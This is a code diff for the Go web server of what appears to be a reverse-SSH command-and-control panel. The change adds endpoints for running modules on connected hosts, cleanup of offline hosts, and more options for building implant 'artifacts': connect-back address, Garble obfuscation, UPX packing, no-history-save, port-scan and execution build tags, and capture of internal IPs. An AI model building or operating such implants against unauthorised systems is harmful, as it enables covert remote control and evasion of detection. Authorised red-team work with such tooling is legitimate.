@@ -76,7 +76,11 @@ func (s *Server) Handler() http.Handler {
 	mux.Handle("GET /api/hosts/{stableID}/filesystem/download", s.requireUser(http.HandlerFunc(s.handleHostFilesystemDownload)))
 	mux.Handle("GET /api/hosts/{stableID}/filesystem/preview", s.requireUser(http.HandlerFunc(s.handleHostFilesystemPreview)))
 	mux.Handle("POST /api/hosts/{stableID}/filesystem/upload", s.requireUser(http.HandlerFunc(s.handleHostFilesystemUpload)))
+	mux.Handle("GET /api/hosts/{stableID}/modules", s.requireUser(http.HandlerFunc(s.handleHostModules)))
+	mux.Handle("POST /api/hosts/{stableID}/modules/{module}/run", s.requireUser(http.HandlerFunc(s.handleRunHostModule)))
 	mux.Handle("POST /api/hosts/exec", s.requireUser(http.HandlerFunc(s.handleExecuteHosts)))
+	mux.Handle("POST /api/hosts/modules/{module}/run", s.requireUser(http.HandlerFunc(s.handleRunHostsModule)))
+	mux.Handle("DELETE /api/hosts/offline", s.requireUser(http.HandlerFunc(s.handleDeleteOfflineHosts)))
 	mux.Handle("PATCH /api/hosts/{stableID}", s.requireUser(http.HandlerFunc(s.handleUpdateHost)))
 	mux.Handle("DELETE /api/hosts/{stableID}", s.requireUser(http.HandlerFunc(s.handleDeleteHost)))
 	mux.Handle("GET /api/artifacts/{urlPath}", s.requireUser(http.HandlerFunc(s.handleArtifact)))
@@ -426,6 +430,52 @@ func (s *Server) handleDeleteHost(w http.ResponseWriter, r *http.Request) {
 	})
 }
 
+func (s *Server) handleDeleteOfflineHosts(w http.ResponseWriter, r *http.Request) {
+	user := currentUser(r)
+	projectName := requestedProject(r)
+	if strings.TrimSpace(projectName) == "" {
+		writeError(w, http.StatusBadRequest, "project is required")
+		return
+	}
+	if !requireProjectAccess(w, user, projectName) {
+		return
+	}
+
+	remoteConnections, err := s.syncProjectRuntimeHosts(r.Context(), projectName)
+	if err != nil {
+		writeError(w, http.StatusBadGateway, err.Error())
+		return
+	}
+
+	hosts, err := s.store.ListHostsForProject(projectName)
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, err.Error())
+		return
+	}
+
+	stableIDs := make([]string, 0, len(hosts))
+	for _, host := range filterHostsForWebUser(hosts, user) {
+		if !store.ProjectMatches(host.Project, projectName) || host.Connected {
+			continue
+		}
+		if len(s.activeConnectionsForProjectHost(host.Project, host.StableID, remoteConnections)) > 0 {
+			continue
+		}
+		stableIDs = append(stableIDs, host.StableID)
+	}
+
+	deleted, err := s.store.DeleteHosts(stableIDs)
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, err.Error())
+		return
+	}
+
+	writeJSON(w, http.StatusOK, map[string]any{
+		"deleted": deleted,
+		"project": store.DisplayProjectName(projectName),
+	})
+}
+
 func (s *Server) handleArtifacts(w http.ResponseWriter, r *http.Request) {
 	user := currentUser(r)
 	projectName := requestedProject(r)
@@ -519,31 +569,35 @@ func (s *Server) handleCreateArtifact(w http.ResponseWriter, r *http.Request) {
 	user := currentUser(r)
 
 	request := struct {
-		Name             string `json:"name"`
-		Comment          string `json:"comment"`
-		Owners           string `json:"owners"`
-		Project          string `json:"project"`
-		GOOS             string `json:"goos"`
-		GOARCH           string `json:"goarch"`
-		GOARM            string `json:"goarm"`
-		ConnectBackHost  string `json:"connectBackHost"`
-		ConnectBackPort  string `json:"connectBackPort"`
-		Transport        string `json:"transport"`
-		Proxy            string `json:"proxy"`
-		SNI              string `json:"sni"`
-		LogLevel         string `json:"logLevel"`
-		WorkingDirectory string `json:"workingDirectory"`
-		SharedObject     bool   `json:"sharedObject"`
-		Garble           bool   `json:"garble"`
-		UPX              bool   `json:"upx"`
-		LZMA             bool   `json:"lzma"`
-		DisableLibC      bool   `json:"disableLibC"`
-		UseHostHeader    bool   `json:"useHostHeader"`
-		NoHistorySave    bool   `json:"noHistorySave"`
-		RawDownload      bool   `json:"rawDownload"`
-		UseKerberos      bool   `json:"useKerberos"`
-		VersionString    string `json:"versionString"`
-		NTLMProxyCreds   string `json:"ntlmProxyCreds"`
+		Name             string   `json:"name"`
+		Comment          string   `json:"comment"`
+		Owners           string   `json:"owners"`
+		Project          string   `json:"project"`
+		GOOS             string   `json:"goos"`
+		GOARCH           string   `json:"goarch"`
+		GOARM            string   `json:"goarm"`
+		ConnectBackHost  string   `json:"connectBackHost"`
+		ConnectBackPort  string   `json:"connectBackPort"`
+		Transport        string   `json:"transport"`
+		Proxy            string   `json:"proxy"`
+		SNI              string   `json:"sni"`
+		LogLevel         string   `json:"logLevel"`
+		WorkingDirectory string   `json:"workingDirectory"`
+		SharedObject     bool     `json:"sharedObject"`
+		Garble           bool     `json:"garble"`
+		UPX              bool     `json:"upx"`
+		LZMA             bool     `json:"lzma"`
+		DisableLibC      bool     `json:"disableLibC"`
+		UseHostHeader    bool     `json:"useHostHeader"`
+		NoHistorySave    bool     `json:"noHistorySave"`
+		BusyBoxFallback  bool     `json:"busyBoxFallback"`
+		Pscan            bool     `json:"pscan"`
+		Execass          bool     `json:"execass"`
+		BuildTags        []string `json:"buildTags"`
+		RawDownload      bool     `json:"rawDownload"`
+		UseKerberos      bool     `json:"useKerberos"`
+		VersionString    string   `json:"versionString"`
+		NTLMProxyCreds   string   `json:"ntlmProxyCreds"`
 	}{}
 	if err := decodeJSON(r, &request); err != nil {
 		writeError(w, http.StatusBadRequest, "invalid json payload")
@@ -559,6 +613,20 @@ func (s *Server) handleCreateArtifact(w http.ResponseWriter, r *http.Request) {
 	if !requireProjectAccess(w, user, projectName) {
 		return
 	}
+	options := system.DiscoverBuildOptions(s.jumpAddressForProject(r.Context(), projectName), s.cfg.RSSHListenAddr, s.cfg.AdvertisedAddrs)
+	targetGOOS := strings.TrimSpace(request.GOOS)
+	if !contains(options.GOOS, targetGOOS) {
+		writeError(w, http.StatusBadRequest, "unsupported GOOS for this rssh build")
+		return
+	}
+	if !contains(options.GOARCH, strings.TrimSpace(request.GOARCH)) {
+		writeError(w, http.StatusBadRequest, "unsupported GOARCH for this rssh build")
+		return
+	}
+	if targetGOOS == "windows" && !validWindowsArtifactName(request.Name) {
+		writeError(w, http.StatusBadRequest, "windows artifact name must end with .exe")
+		return
+	}
 	if strings.TrimSpace(request.Name) == "" {
 		generatedName, err := internal.RandomString(16)
 		if err != nil {
@@ -566,16 +634,6 @@ func (s *Server) handleCreateArtifact(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		request.Name = generatedName
-	}
-
-	options := system.DiscoverBuildOptions(s.jumpAddressForProject(r.Context(), projectName), s.cfg.RSSHListenAddr, s.cfg.AdvertisedAddrs)
-	if !contains(options.GOOS, strings.TrimSpace(request.GOOS)) {
-		writeError(w, http.StatusBadRequest, "unsupported GOOS for this rssh build")
-		return
-	}
-	if !contains(options.GOARCH, strings.TrimSpace(request.GOARCH)) {
-		writeError(w, http.StatusBadRequest, "unsupported GOARCH for this rssh build")
-		return
 	}
 
 	connectBackAddress := s.jumpAddressForProject(r.Context(), projectName)
@@ -591,7 +649,7 @@ func (s *Server) handleCreateArtifact(w http.ResponseWriter, r *http.Request) {
 		Name:              strings.TrimSpace(request.Name),
 		Comment:           strings.TrimSpace(request.Comment),
 		Owners:            strings.TrimSpace(request.Owners),
-		GOOS:              strings.TrimSpace(request.GOOS),
+		GOOS:              targetGOOS,
 		GOARCH:            strings.TrimSpace(request.GOARCH),
 		GOARM:             strings.TrimSpace(request.GOARM),
 		ConnectBackAdress: applyTransport(connectBackAddress, request.Transport),
@@ -607,6 +665,8 @@ func (s *Server) handleCreateArtifact(w http.ResponseWriter, r *http.Request) {
 		RawDownload:       request.RawDownload,
 		UseHostHeader:     request.UseHostHeader,
 		NoHistorySave:     request.NoHistorySave,
+		BusyBoxFallback:   request.BusyBoxFallback,
+		BuildTags:         artifactBuildTags(request.BuildTags, request.Pscan, request.Execass),
 		WorkingDirectory:  strings.TrimSpace(request.WorkingDirectory),
 		NTLMProxyCreds:    strings.TrimSpace(request.NTLMProxyCreds),
 		VersionString:     strings.TrimSpace(request.VersionString),
@@ -647,6 +707,21 @@ func (s *Server) handleCreateArtifact(w http.ResponseWriter, r *http.Request) {
 		"project":         store.DisplayProjectName(projectName),
 		"clientStableId":  buildResult.ClientStableID,
 	})
+}
+
+func artifactBuildTags(tags []string, pscan, execass bool) []string {
+	out := append([]string(nil), tags...)
+	if pscan {
+		out = append(out, "pscan")
+	}
+	if execass {
+		out = append(out, "execass")
+	}
+	return out
+}
+
+func validWindowsArtifactName(name string) bool {
+	return strings.HasSuffix(strings.ToLower(strings.TrimSpace(name)), ".exe")
 }
 
 func (s *Server) handleDeleteArtifact(w http.ResponseWriter, r *http.Request) {
@@ -734,6 +809,7 @@ func (s *Server) makeHostResponse(user store.WebUser, host store.HostRecord, act
 		ObservedHostname:       host.Hostname,
 		DisplayName:            host.DisplayName,
 		IP:                     host.RemoteIP,
+		InternalIP:             host.InternalIP,
 		RemoteAddr:             host.RemoteAddr,
 		Comment:                host.Comment,
 		Version:                host.Version,
@@ -742,7 +818,7 @@ func (s *Server) makeHostResponse(user store.WebUser, host store.HostRecord, act
 		Connected:              len(activeConnections) > 0,
 		Project:                store.DisplayProjectName(host.Project),
 		Tags:                   store.DecodeTags(host.Tags),
-		DateAdded:              host.FirstSeenAt,
+		DateAdded:              hostDateAdded(host),
 		LastActivityAt:         host.LastActivityAt,
 		LastConnectionAt:       host.LastConnectedAt,
 		LastDisconnectAt:       host.LastDisconnectedAt,
@@ -756,6 +832,16 @@ func (s *Server) makeHostResponse(user store.WebUser, host store.HostRecord, act
 			RemoteForward: fmt.Sprintf("ssh -R 1234:localhost:1234 -J %s %s", jumpTarget, defaultTarget),
 		},
 	}
+}
+
+func hostDateAdded(host store.HostRecord) *time.Time {
+	if host.FirstSeenAt != nil {
+		return host.FirstSeenAt
+	}
+	if host.CreatedAt.IsZero() {
+		return nil
+	}
+	return &host.CreatedAt
 }
 
 func jumpAddressForUser(user store.WebUser, jumpAddress string) string {
@@ -789,6 +875,7 @@ func (s *Server) activeConnectionsForHost(stableID string) []hostConnectionRespo
 			Hostname:     snapshot.Hostname,
 			RemoteAddr:   snapshot.RemoteAddr,
 			RemoteIP:     snapshot.RemoteIP,
+			InternalIP:   snapshot.InternalIP,
 			Version:      snapshot.Version,
 			Comment:      snapshot.Comment,
 		})
@@ -895,6 +982,7 @@ type hostResponse struct {
 	ObservedHostname       string                   `json:"observedHostname"`
 	DisplayName            string                   `json:"displayName"`
 	IP                     string                   `json:"ip"`
+	InternalIP             string                   `json:"internalIp"`
 	RemoteAddr             string                   `json:"remoteAddr"`
 	Comment                string                   `json:"comment"`
 	Version                string                   `json:"version"`
@@ -918,6 +1006,7 @@ type hostConnectionResponse struct {
 	Hostname     string `json:"hostname"`
 	RemoteAddr   string `json:"remoteAddr"`
 	RemoteIP     string `json:"remoteIp"`
+	InternalIP   string `json:"internalIp"`
 	Version      string `json:"version"`
 	Comment      string `json:"comment"`
 }
